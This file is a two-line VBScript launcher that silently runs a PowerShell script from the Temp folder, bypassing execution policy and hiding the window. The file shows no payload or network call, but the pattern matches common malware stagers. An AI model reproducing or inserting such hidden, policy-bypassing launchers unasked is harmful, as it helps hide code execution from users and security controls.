Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoP -Ep Bypass %Temp%\script.ps1", 0, false
